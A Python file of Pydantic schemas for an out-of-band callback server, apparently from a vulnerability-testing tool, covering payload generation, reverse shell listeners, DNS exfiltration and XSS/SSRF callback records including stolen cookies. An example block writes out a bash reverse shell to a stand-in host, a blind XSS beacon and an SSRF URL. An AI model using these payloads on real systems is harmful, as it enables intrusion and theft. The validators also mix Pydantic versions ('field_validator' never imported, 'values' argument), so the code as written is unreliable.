"""
Pydantic schemas for callback server API endpoints
"""

from typing import List, Optional, Dict, Any, Union
from datetime import datetime
from pydantic import BaseModel, Field, validator
from uuid import UUID


class CallbackServerConfigSchema(BaseModel):
    """Configuration schema for callback server"""
    base_domain: str = Field(..., description="Base domain for callbacks (e.g., callback.yourdomain.com)")
    http_port: int = Field(8080, ge=1, le=65535, description="HTTP callback server port")
    dns_port: int = Field(53, ge=1, le=65535, description="DNS callback server port")
    shell_port_range_start: int = Field(4444, ge=1024, le=65535, description="Start of reverse shell port range")
    shell_port_range_end: int = Field(4500, ge=1024, le=65535, description="End of reverse shell port range")
    enable_ssl: bool = Field(False, description="Enable SSL/TLS for HTTP callbacks")
    ssl_cert_path: Optional[str] = Field(None, description="Path to SSL certificate")
    ssl_key_path: Optional[str] = Field(None, description="Path to SSL private key")
    callback_retention_hours: int = Field(24, ge=1, le=168, description="Hours to retain callback data")
    
    @field_validator('shell_port_range_end')
    @classmethod
    def validate_port_range(cls, v, values):
        if 'shell_port_range_start' in values and v <= values['shell_port_range_start']:
            raise ValueError('shell_port_range_end must be greater than shell_port_range_start')
        return v


class CallbackPayloadGenerateRequest(BaseModel):
    """Schema for callback payload generation requests"""
    vulnerability_id: UUID
    vulnerability_type: Optional[str] = Field(None, description="Override vulnerability type")
    custom_parameters: Dict[str, Any] = Field({}, description="Custom parameters for payload generation")
    payload_types: Optional[List[str]] = Field(None, description="Specific payload types to generate")
    include_shell_payloads: bool = Field(True, description="Include reverse shell payloads")
    timeout_hours: int = Field(24, ge=1, le=168, description="Callback timeout in hours")


class CallbackPayloadResponse(BaseModel):
    """Schema for callback payload response"""
    callback_id: str
    callback_domain: str
    callback_url: str
    payloads: Dict[str, str]
    
    class Config:
        schema_extra = {
            "example": {
                "callback_id": "abc123def456",
                "callback_domain": "abc123def456.callback.example.com",
                "callback_url": "http://callback.example.com:8080/callback/abc123def456",
                "payloads": {
                    "blind_xss_img": "<img src=\"http://callback.example.com:8080/callback/abc123def456/xss.png\" style=\"display:none\">",
                    "ssrf_http": "http://callback.example.com:8080/callback/abc123def456",
                    "reverse_shell_bash": "bash -i >& /dev/tcp/callback.example.com/4444 0>&1"
                }
            }
        }


class CallbackStatusSchema(BaseModel):
    """Schema for callback status"""
    callback_id: str
    callback_type: str
    status: str
    created_at: str
    expires_at: str
    received_at: Optional[str] = None
    source_ip: Optional[str] = None
    confidence_score: int = Field(0, ge=0, le=100)
    vulnerability_id: Optional[str] = None
    evidence: Dict[str, Any] = {}
    metadata: Dict[str, Any] = {}


class CallbackDetailsSchema(BaseModel):
    """Schema for detailed callback information"""
    callback_id: str
    callback_type: str
    status: str
    created_at: str
    expires_at: str
    received_at: Optional[str] = None
    source_ip: Optional[str] = None
    user_agent: Optional[str] = None
    headers: Dict[str, str] = {}
    request_data: Optional[str] = None
    confidence_score: int = Field(0, ge=0, le=100)
    vulnerability_id: Optional[str] = None
    evidence: Dict[str, Any] = {}
    metadata: Dict[str, Any] = {}
    vulnerability_context: Optional[Dict[str, Any]] = None


class CallbackListItem(BaseModel):
    """Schema for callback list items"""
    callback_id: str
    callback_type: str
    status: str
    created_at: str
    received_at: Optional[str] = None
    source_ip: Optional[str] = None
    confidence_score: int = Field(0, ge=0, le=100)
    vulnerability_id: Optional[str] = None


class CallbackListResponse(BaseModel):
    """Schema for callback list response"""
    callbacks: List[CallbackListItem]
    total_count: int
    page_info: Dict[str, Any]


class CallbackStatisticsSchema(BaseModel):
    """Schema for callback statistics"""
    timeframe_days: int
    total_callbacks: int
    received_callbacks: int
    success_rate: float = Field(ge=0.0, le=1.0)
    average_confidence: float = Field(ge=0.0, le=100.0)
    by_type: Dict[str, Dict[str, Any]]
    active_callbacks: int
    server_status: Dict[str, Any]


class CallbackServerStatusSchema(BaseModel):
    """Schema for callback server status"""
    status: str  # running, stopped, error
    base_domain: str
    http_port: int
    dns_port: int
    active_callbacks: int
    shell_listeners: int
    uptime_seconds: int
    last_callback: Optional[str] = None


class CallbackTypeSchema(BaseModel):
    """Schema for callback type information"""
    type: str
    description: str
    use_cases: List[str]


class CallbackTestRequest(BaseModel):
    """Schema for callback testing"""
    source_ip: str = Field("127.0.0.1", description="Source IP for test")
    headers: Dict[str, str] = Field({}, description="HTTP headers for test")
    data: Dict[str, Any] = Field({}, description="Test data payload")
    user_agent: str = Field("Test-Agent", description="User agent for test")
    timestamp: Optional[str] = Field(None, description="Test timestamp")


class ReverseShellCallbackSchema(BaseModel):
    """Schema for reverse shell callback details"""
    callback_id: str
    shell_type: str
    port: int
    initial_response: str
    session_log: List[Dict[str, Any]] = []
    session_duration: int
    commands_executed: int
    os_info: Optional[Dict[str, str]] = None


class DNSCallbackSchema(BaseModel):
    """Schema for DNS callback details"""
    callback_id: str
    query_name: str
    query_type: str
    source_ip: str
    domain: str
    subdomain_parts: List[str] = []
    exfiltrated_data: Optional[str] = None


class XSSCallbackSchema(BaseModel):
    """Schema for XSS callback details"""
    callback_id: str
    victim_url: str
    victim_domain: str
    cookies: Optional[str] = None
    local_storage: Optional[Dict[str, Any]] = None
    session_storage: Optional[Dict[str, Any]] = None
    page_content: Optional[str] = None
    referrer: Optional[str] = None
    user_agent: str
    browser_info: Dict[str, Any] = {}


class SSRFCallbackSchema(BaseModel):
    """Schema for SSRF callback details"""
    callback_id: str
    request_method: str
    request_headers: Dict[str, str] = {}
    request_body: Optional[str] = None
    internal_ip: Optional[str] = None
    response_data: Optional[str] = None
    metadata_accessed: List[str] = []


class CallbackEvidenceSchema(BaseModel):
    """Schema for callback evidence"""
    callback_received_at: str
    callback_type: str
    source_verification: Dict[str, Any]
    data_analysis: Dict[str, Any]
    confidence_factors: List[str] = []
    suspicious_indicators: List[str] = []
    decoded_data: Dict[str, Any] = {}
    geolocation: Optional[Dict[str, Any]] = None


class BulkCallbackGenerateRequest(BaseModel):
    """Schema for bulk callback generation"""
    vulnerability_ids: List[UUID] = Field(..., min_items=1, max_items=50)
    payload_types: Optional[List[str]] = Field(None, description="Specific payload types to generate")
    timeout_hours: int = Field(24, ge=1, le=168, description="Callback timeout in hours")
    custom_parameters: Dict[str, Any] = Field({}, description="Custom parameters for all payloads")


class BulkCallbackGenerateResponse(BaseModel):
    """Schema for bulk callback generation response"""
    message: str
    results: List[Dict[str, Any]]
    total_processed: int
    successful: int
    failed: int


class CallbackNotificationSchema(BaseModel):
    """Schema for callback notifications"""
    callback_id: str
    notification_type: str  # critical, success, warning
    title: str
    message: str
    vulnerability_id: Optional[str] = None
    target_name: str
    confidence_score: int
    timestamp: str
    metadata: Dict[str, Any] = {}


class CallbackWebhookSchema(BaseModel):
    """Schema for callback webhook payloads"""
    event: str  # callback_received, callback_processed
    callback_id: str
    callback_type: str
    timestamp: str
    data: Dict[str, Any]
    signature: Optional[str] = None  # HMAC signature for webhook verification


class CallbackConfigTemplateSchema(BaseModel):
    """Schema for callback configuration templates"""
    template_id: str
    template_name: str
    description: str
    vulnerability_types: List[str]
    payload_templates: Dict[str, str]
    default_timeout_hours: int = 24
    custom_parameters: Dict[str, Any] = {}
    created_by: str
    created_at: str
    usage_count: int = 0


class CallbackAnalyticsSchema(BaseModel):
    """Schema for callback analytics"""
    period: str  # daily, weekly, monthly
    callback_trends: List[Dict[str, Any]]
    success_rates_by_type: Dict[str, float]
    top_source_ips: List[Dict[str, Any]]
    geographical_distribution: Dict[str, int]
    payload_effectiveness: Dict[str, Dict[str, Any]]
    response_times: Dict[str, float]
    false_positive_indicators: List[str]


class CallbackSecuritySchema(BaseModel):
    """Schema for callback security settings"""
    allowed_source_ips: List[str] = []
    blocked_source_ips: List[str] = []
    rate_limiting: Dict[str, int] = {"requests_per_minute": 60}
    suspicious_behavior_detection: bool = True
    auto_block_suspicious_ips: bool = False
    webhook_verification: bool = True
    encryption_enabled: bool = False
    access_logs_retention_days: int = 30


class CallbackIntegrationSchema(BaseModel):
    """Schema for callback integrations"""
    integration_type: str  # slack, discord, webhook, email
    enabled: bool = True
    configuration: Dict[str, Any]
    notification_events: List[str] = ["callback_received", "high_confidence_callback"]
    filtering_rules: Dict[str, Any] = {}
    created_at: str
    last_used: Optional[str] = None


class CallbackExportSchema(BaseModel):
    """Schema for callback data export"""
    export_format: str = Field("json", description="Export format: json, csv, xml")
    date_from: Optional[str] = Field(None, description="Start date for export")
    date_to: Optional[str] = Field(None, description="End date for export")
    callback_types: Optional[List[str]] = Field(None, description="Filter by callback types")
    include_evidence: bool = Field(True, description="Include evidence data")
    include_raw_data: bool = Field(False, description="Include raw request/response data")
    
    @field_validator('export_format')
    @classmethod
    def validate_export_format(cls, v):
        if v.lower() not in ['json', 'csv', 'xml']:
            raise ValueError('export_format must be one of: json, csv, xml')
        return v.lower()


class CallbackHealthCheckSchema(BaseModel):
    """Schema for callback server health check"""
    status: str  # healthy, degraded, unhealthy
    timestamp: str
    services: Dict[str, Dict[str, Any]]  # http, dns, shell_listeners
    performance_metrics: Dict[str, float]
    active_connections: int
    memory_usage: Dict[str, Any]
    disk_usage: Dict[str, Any]
    errors: List[str] = []
    warnings: List[str] = []


class CallbackQueueSchema(BaseModel):
    """Schema for callback processing queue"""
    queue_size: int
    processing_rate: float  # callbacks per second
    average_processing_time: float
    pending_callbacks: List[Dict[str, Any]]
    failed_callbacks: List[Dict[str, Any]]
    queue_health: str  # healthy, congested, blocked


class CallbackRetentionPolicySchema(BaseModel):
    """Schema for callback data retention policies"""
    policy_name: str
    retention_period_days: int = Field(30, ge=1, le=365)
    auto_cleanup_enabled: bool = True
    archive_before_deletion: bool = False
    archive_location: Optional[str] = None
    callback_types: List[str] = []  # Empty means all types
    conditions: Dict[str, Any] = {}  # Additional retention conditions
    created_at: str
    last_cleanup: Optional[str] = None


class CallbackMetricsSchema(BaseModel):
    """Schema for callback performance metrics"""
    response_time_percentiles: Dict[str, float]  # p50, p95, p99
    throughput: Dict[str, float]  # requests per second by endpoint
    error_rates: Dict[str, float]  # by callback type
    resource_utilization: Dict[str, float]  # CPU, memory, network
    concurrent_connections: int
    callback_success_patterns: List[Dict[str, Any]]
    performance_trends: List[Dict[str, Any]]
    